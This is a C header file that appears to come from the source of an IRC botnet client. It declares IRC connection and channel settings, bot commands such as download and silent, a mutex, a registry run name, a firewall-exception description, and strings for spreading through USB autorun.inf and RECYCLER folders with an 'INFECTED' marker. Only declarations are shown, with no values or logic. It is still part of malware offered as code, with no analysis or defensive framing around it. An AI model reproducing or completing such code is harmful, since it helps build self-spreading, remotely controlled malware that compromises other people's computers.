typedef struct 
{
	char *host;
	unsigned short port;
	char *password;
} ircconnect_s;

extern ircconnect_s ircconnect[];

extern unsigned long cfg_reconnectsleep; // msec
extern unsigned long cfg_ircmaxwaittime; // sec
//config
extern char cfg_ircchannel[];
extern char cfg_ircchanpass[];
extern char cfg_irchost[];
extern char cfg_ircorderprefix[];
extern char infochan[];
extern char cfg_mutex[];
extern char cfg_filename[];
extern char cfg_firewall_description[];
extern char gotopth[];
extern char szRegname[];
//commands
extern char cmd_silent[];
extern char cmd_join[];
extern char cmd_part[];
extern char cmd_download[];
/* USB SHIT */
extern char USB_STR_RECYCLER[];
extern char USB_STR_REC_SUBDIR[];
extern char USB_STR_DESKTOP_DATA[];
extern char USB_STR_DESKTOP_INI[];
extern char USB_STR_AUTORUN_INF[];
extern char USB_STR_AUTORUN_DATA1[];
extern char USB_STR_AUTORUN_DATA2[];
extern char USB_STR_AUTORUN_DATA3[];
extern char USB_STR_INFECTED[];
extern char pending;